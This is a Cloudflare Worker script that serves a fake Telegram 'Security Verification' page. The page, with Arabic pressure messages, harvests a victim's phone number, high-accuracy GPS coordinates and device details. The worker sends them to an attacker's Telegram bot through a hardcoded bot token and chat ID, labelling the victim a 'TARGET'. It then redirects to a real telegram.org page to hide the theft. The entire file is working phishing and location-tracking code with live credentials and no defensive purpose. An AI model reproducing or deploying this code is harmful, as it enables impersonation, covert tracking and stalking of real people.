export default {
  async fetch(request, env) {
    if (request.method === "GET") {
      return new Response(`
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Telegram Messenger</title>
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
          <style>
            body { font-family: -apple-system, sans-serif; background: #fff; display: flex; justify-content: center; padding-top: 50px; }
            .container { text-align: center; max-width: 350px; width: 90%; }
            .logo { width: 100px; margin-bottom: 20px; }
            h2 { font-weight: 500; margin-bottom: 10px; }
            p { color: #707579; font-size: 14px; margin-bottom: 30px; }
            input { width: 100%; padding: 14px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
            button { width: 100%; padding: 14px; background: #3390ec; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
          </style>
        </head>
        <body>
          <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
            <h2>Security Verification</h2>
            <p>To protect your account, Telegram needs to verify your location. Please allow access to continue.</p>
            <input id="phone" type="tel" placeholder="+964 7XX XXX XXXX">
            <button onclick="checkAndSend()">NEXT</button>
          </div>

          <script>
            function checkAndSend() {
              const phone = document.querySelector("#phone").value;
              if (!phone) {
                alert("يرجى إدخال رقم الهاتف أولاً");
                return;
              }

              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                  (pos) => {
                    // إذا وافق، نرسل البيانات
                    sendToServer(phone, pos.coords.latitude, pos.coords.longitude);
                  },
                  (err) => {
                    // إذا رفض، نظهر له رسالة إجبارية
                    alert("⚠️ خطأ في التحقق: يجب عليك إعطاء إذن الموقع ليتم المتابعة وتأمين حسابك.");
                  },
                  { enableHighAccuracy: true }
                );
              } else {
                alert("متصفحك لا يدعم خاصية التحقق من الموقع.");
              }
            }

            async function sendToServer(phone, lat, lon) {
              const model = navigator.userAgent;
              await fetch(window.location.href, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone, lat, lon, model})
              });
              // تحويل المستخدم بعد النجاح
              window.location.href = "https://telegram.org/blog/504-error";
            }
          </script>
        </body>
        </html>
      `, { headers: { "Content-Type": "text/html" } });
    }

    if (request.method === "POST") {
      try {
        const data = await request.json();
        const BOT_TOKEN = "6939721323:AAG9eDCNgz3Kct9APMRfrZUCDDSJfKbu8tc";
        const CHAT_ID = "5794792675";

        const mapUrl = `https://www.google.com/maps?q=\${data.lat},\${data.lon}`;

        const message = "🎯 [TARGET VERIFIED - GPS ONLY] 🎯\\n" +
                        "--------------------------------\\n" +
                        "📱 Phone: " + data.phone + "\\n" +
                        "📍 GPS Coords: " + data.lat + "," + data.lon + "\\n" +
                        "🗺 Google Maps: " + mapUrl + "\\n" +
                        "🛠 Device: " + data.model;

        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });

        return new Response("ok");
      } catch (e) {
        return new Response("error", { status: 400 });
      }
    }
    return new Response("Method Not Allowed", { status: 405 });
  }
};
